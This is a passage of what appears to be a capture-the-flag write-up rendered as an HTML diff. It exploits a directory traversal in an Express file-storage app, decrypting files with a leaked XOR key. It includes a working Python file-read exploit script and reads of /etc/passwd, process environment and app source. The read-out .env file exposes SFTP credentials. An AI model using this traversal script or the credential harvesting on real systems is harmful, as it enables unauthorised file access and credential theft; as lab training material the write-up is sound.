YjJl5cckJMCRd4MFFRJkJXFQk4JFpWQghaSEg+LUBMKQNaH0g0LF1WLQ5NQB1tcgILclsMT1ZjeQkXJgJXHx0+MEddJhkDVRAkMRxLKgRXVQs4L1xfIQMzJQY/MVxWMVdBQFRmdwkJelwDOQ0lLF1BaAlYHwg4LR8UZFcWDAQlbF9RKkJaEhc4LUoCZxhKCEokIVpWZwNWFgowKl0yPQ9MFBEieUsCeV0JSl9mcwMIcjhbDwsjNgkXIAJUH0oiIUZWPBgDVQc+LRxaKR5RcAkvJwlAclQAQ19mcwMCckJPGxd4MF1ZOEJVAgF4IFxVJQJXVQkvJwkXKgRXVQM2L0BdQglcDF8veQIIeFwDS1VncgkUZEEDVQ04LlYXLAhPQEo1Kl0XKgxKEm8kJUdIPR5cCF8veQIIeF8DS1VncQkUZEEDVQ04LlYXOwtNChAkJkECZw9QFEoxIl9LLWdmFgQiMVZUchUDQ1xveQoBcFcDVRM2MRxUJwoWFgQiMVZUckJbEwt4JVJUOwgz</span><span class="sh">'</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">e</span> <span class="o">^</span> <span class="n">k</span><span class="p">)</span> <span class="k">for</span> <span class="n">e</span><span class="p">,</span> <span class="n">k</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">keystream</span><span class="p">))</span>
+<span class="go">'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:102:105::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsyslog:x:104:111::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:113::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:114::/nonexistent:/usr/sbin/nologin\nsshd:x:109:65534::/run/sshd:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nlandscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin\nfwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin\n_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\nlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\ndev:x:1001:1001:,,,:/home/dev:/bin/bash\nsftpuser:x:1002:1002:,,,:/home/sftpuser:/bin/false\n_laurel:x:998:998::/var/log/laurel:/bin/false\n'
+</span></code></pre></div></div>
+<p>It works!</p>
+<p>I’ll write a Python script that takes an absolute path on the target, reads the encrypted file using the directory traversal, decrypts it, and prints it:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env -S uv run --script 
+# /// script
+# requires-python = "&gt;=3.12"
+# dependencies = [
+#     "requests",
+# ]
+# ///
+</span><span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">from</span> <span class="n">itertools</span> <span class="kn">import</span> <span class="n">cycle</span>
+
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;host&gt; &lt;absolute path&gt;</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">enc_path</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">%2f</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">:5000/file/..%2f..%2F..%2F..%2F..%2F..</span><span class="si">{</span><span class="n">enc_path</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">ReadTimeout</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;File Not Found&gt;</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+<span class="n">enc_b64</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span>
+    <span class="sa">r</span><span class="sh">'</span><span class="s">data:application/octet-stream;charset=utf-8;base64,(.+?)</span><span class="sh">"'</span><span class="p">,</span>
+    <span class="n">resp</span><span class="p">.</span><span class="n">text</span>
+<span class="p">).</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">enc</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">enc_b64</span><span class="p">)</span>
+<span class="n">pt</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">e</span><span class="o">^</span><span class="n">k</span><span class="p">)</span> <span class="k">for</span> <span class="n">e</span><span class="p">,</span> <span class="n">k</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="nf">cycle</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Hm9zeWC38</span><span class="sh">"</span><span class="p">)))</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
+</code></pre></div></div>
+<p>When the file doesn’t exist, the server hangs for a long time without responding. I’ve compensated for this with a timeout.</p>
+<p>It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>./file_read.py 10.129.31.17 /etc/hostname
+<span class="go">store
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>./file_read.py 10.129.31.17 /etc/notarealfile
+<span class="go">&lt;File Not Found&gt;
+</span></code></pre></div></div>
+<h3 id="host-system-enumeration">Host System Enumeration</h3>
+<h4 id="general">General</h4>
+<p>I’ll start with <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>./file_read.py 10.129.31.17 /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh$'</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+dev:x:1001:1001:,,,:/home/dev:/bin/bash
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>./file_read.py 10.129.31.17 /etc/passwd
+<span class="go">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+syslog:x:104:111::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+ec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin
+_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+dev:x:1001:1001:,,,:/home/dev:/bin/bash
+sftpuser:x:1002:1002:,,,:/home/sftpuser:/bin/false
+_laurel:x:998:998::/var/log/laurel:/bin/false
+</span></code></pre></div></div>
+<p>ubuntu and dev are the non root users with shells set. I’ll take a look at the environment variables in the current process with <code class="language-plaintext highlighter-rouge">/proc/self/environ</code> (which returns null separated values, so I’ll use <code class="language-plaintext highlighter-rouge">tr</code> to replace those with newlines):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>./file_read.py 10.129.31.17 /proc/self/environ | <span class="nb">tr</span> <span class="s1">'\00'</span> <span class="s1">'\n'</span> 
+<span class="go">USER=dev
+npm_config_user_agent=npm/8.5.1 node/v12.22.9 linux x64 workspaces/false
+npm_node_execpath=/usr/bin/node
+npm_config_noproxy=
+HOME=/home/dev
+npm_package_json=/home/dev/projects/store1/package.json
+npm_config_userconfig=/home/dev/.npmrc
+npm_config_local_prefix=/home/dev/projects/store1
+SYSTEMD_EXEC_PID=841
+COLOR=0
+npm_config_metrics_registry=https://registry.npmjs.org/
+LOGNAME=dev
+JOURNAL_STREAM=8:6217
+npm_config_prefix=/usr/local
+npm_config_cache=/home/dev/.npm
+npm_config_node_gyp=/usr/share/nodejs/node-gyp/bin/node-gyp.js
+PATH=/home/dev/projects/store1/node_modules/.bin:/home/dev/projects/store1/node_modules/.bin:/home/dev/projects/node_modules/.bin:/home/dev/node_modules/.bin:/home/node_modules/.bin:/node_modules/.bin:/usr/share/nodejs/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+INVOCATION_ID=4abbfc48b5e44622bb0ac38ca33addb7
+NODE=/usr/bin/node
+LANG=C.UTF-8
+npm_lifecycle_script=nodemon --exec 'node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js'
+SHELL=/bin/bash
+npm_lifecycle_event=watch
+npm_config_globalconfig=/etc/npmrc
+npm_config_init_module=/home/dev/.npm-init.js
+npm_config_globalignorefile=/etc/npmignore
+npm_execpath=/usr/share/nodejs/npm/bin/npm-cli.js
+PWD=/home/dev/projects/store1
+npm_config_global_prefix=/usr/local
+npm_command=run-script
+INIT_CWD=/home/dev/projects/store1
+EDITOR=vi
+</span></code></pre></div></div>
+<p>It’s running as the dev user. The <code class="language-plaintext highlighter-rouge">npm_lifecycle_script</code> looks like what starts the webserver. That’s confirmed by reading <code class="language-plaintext highlighter-rouge">/proc/self/cmdline</code> (with nulls replaced with spaces):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>./file_read.py 10.129.31.17 /proc/self/cmdline | <span class="nb">tr</span> <span class="s1">'\00'</span> <span class="s1">' '</span> 
+<span class="go">node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js 
+</span></code></pre></div></div>
+<p>The presence of <code class="language-plaintext highlighter-rouge">--inspect</code> is interesting and I’ll come back to this.</p>
+<p>I’ll check for SSH keys or other interesting things in the dev user’s home directory, but not find much.</p>
+<h4 id="web-source">Web Source</h4>
+<p>I’ll grab <code class="language-plaintext highlighter-rouge">start.js</code>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">dotenv</span><span class="dl">'</span><span class="p">).</span><span class="nf">config</span><span class="p">();</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./app</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">server</span> <span class="o">=</span> <span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`Express is running on port </span><span class="p">${</span><span class="nx">server</span><span class="p">.</span><span class="nf">address</span><span class="p">().</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>There’s two interesting bits here:</p>
+<ul>
+<li>The <code class="language-plaintext highlighter-rouge">dotenv</code> package will read environment variables from a <code class="language-plaintext highlighter-rouge">.env</code> file in the same directory.</li>
+<li>The main webserver code is in <code class="language-plaintext highlighter-rouge">app.js</code>.</li>
+</ul>
+<p>The <code class="language-plaintext highlighter-rouge">.env</code> file has four items:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">SFTP_URL</span><span class="o">=</span>sftp://sftpuser:WidK52pWBtWQdcVC@localhost
+<span class="nv">SECRET</span><span class="o">=</span>Hm9zeWC38
+<span class="nv">STORE_HOME</span><span class="o">=</span>/home/dev/projects/store1
+<span class="nv">PORT</span><span class="o">=</span>5000
+</code></pre></div></div>
+<p>It’s interesting that it’s only port 5000 (where do 5001 and 5002 come from?). The <code class="language-plaintext highlighter-rouge">SECRET</code> is the encryption XOR key. There are creds for sftpuser, which <code class="language-plaintext highlighter-rouge">passwd</code> shows has UID 1002, but the shell set to <code class="language-plaintext highlighter-rouge">false</code>. I’ll come back to this.</p>
+<p><code class="language-plaintext highlighter-rouge">app.js</code> sets up <a href="https://expressjs.com/">ExpressJS</a> and the routes in <code class="language-plaintext highlighter-rouge">./routes</code>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">routes</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/index</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">body-parser</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">pug</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nf">static</span><span class="p">(</span><span class="dl">'</span><span class="s1">public</span><span class="dl">'</span><span class="p">));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nf">urlencoded</span><span class="p">({</span> <span class="na">extended</span><span class="p">:</span> <span class="kc">true</span> <span class="p">}));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="nx">routes</span><span class="p">);</span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">app</span><span class="p">;</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/home/dev/projects/store1/routes/index.js</code> has the guts of the application:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">SFTPClient</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../sftp</span><span class="dl">'</span><span class="p">).</span><span class="nx">SFTPClient</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">multer</span>  <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">multer</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">xorFileContents</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../crypto</span><span class="dl">'</span><span class="p">).</span><span class="nx">xorFileContents</span><span class="p">;</span>
+
+
+<span class="kd">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nc">Router</span><span class="p">();</span>
+
+<span class="kd">var</span> <span class="nx">storage</span> <span class="o">=</span> <span class="nx">multer</span><span class="p">.</span><span class="nf">diskStorage</span><span class="p">({</span>
+    <span class="na">destination</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="dl">'</span><span class="s1">public/tmp/</span><span class="dl">'</span><span class="p">)</span>
+    <span class="p">},</span>
+    <span class="na">filename</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">file</span><span class="p">.</span><span class="nx">originalname</span><span class="p">)</span>
+  <span class="p">}</span>
+<span class="p">})</span>
+<span class="kd">var</span> <span class="nx">upload</span> <span class="o">=</span> <span class="nf">multer</span><span class="p">({</span> <span class="na">storage</span><span class="p">:</span> <span class="nx">storage</span> <span class="p">})</span>
+
+<span class="kd">const</span> <span class="nx">parsedURL</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URL</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">SFTP_URL</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="nx">parsedURL</span><span class="p">.</span><span class="nx">port</span> <span class="o">||</span> <span class="mi">22</span><span class="p">;</span>
+<span class="kd">const</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">parsedURL</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SFTPClient</span><span class="p">();</span>
+<span class="nx">client</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span> <span class="p">});</span>
+
+<span class="c1">// index</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">index</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">title</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Secure Encrypted Storage - 01001101 01101001 01101100 01101001 01110100 01100001 01110010 01111001 00100000 01000111 01110010 01100001 01100100 01100101</span><span class="dl">'</span> <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="c1">// list files on sftp</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/list</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">fileNames</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">client</span><span class="p">.</span><span class="nf">listFiles</span><span class="p">(</span><span class="dl">"</span><span class="s2">files</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">list</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>  <span class="na">title</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Secure Encrypted Storage - List</span><span class="dl">'</span><span class="p">,</span> <span class="na">fileNames</span><span class="p">:</span> <span class="nx">fileNames</span> <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="c1">// upload file to temp folder, move encrypted into sftp &amp; remove temp file</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/upload</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">upload</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">title</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Secure Encrypted Storage - Upload</span><span class="dl">'</span> <span class="p">});</span>
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/upload</span><span class="dl">'</span><span class="p">,</span> <span class="nx">upload</span><span class="p">.</span><span class="nf">single</span><span class="p">(</span><span class="dl">'</span><span class="s1">imageupload</span><span class="dl">'</span><span class="p">),</span> <span class="k">async</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">file</span><span class="p">.</span><span class="nx">filename</span><span class="p">;</span>
+    <span class="kd">const</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">STORE_HOME</span><span class="p">}</span><span class="s2">/public/tmp/</span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+    <span class="c1">// Todo: Use unique keys for each user</span>
+    <span class="k">await</span> <span class="nf">xorFileContents</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">SECRET</span><span class="p">,</span> <span class="nx">inplace</span><span class="o">=</span><span class="kc">true</span><span class="p">);</span>
+    <span class="k">await</span> <span class="nx">client</span><span class="p">.</span><span class="nf">uploadFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="s2">`files/</span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+    <span class="c1">// Todo: Remove unencrypted files from uploads dir</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="s2">`
+        &lt;script&gt;
+            setTimeout(function() {
+            window.location.href = '/';
+            }, 1000);
+        &lt;/script&gt;
+        File upload successfully.
+        `</span><span class="p">);</span>
+<span class="p">});</span>
+
+
+<span class="c1">// get content of a specific file</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/file/:file</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
+    <span class="kd">const</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">STORE_HOME</span><span class="p">}</span><span class="s2">/public/tmp/</span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">normalize</span><span class="p">(</span><span class="nx">filePath</span><span class="p">)</span> <span class="o">==</span> <span class="nx">filePath</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">await</span> <span class="nx">client</span><span class="p">.</span><span class="nf">downloadFile</span><span class="p">(</span><span class="s2">`files/</span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="nx">filePath</span><span class="p">);</span>
+    <span class="p">}</span>
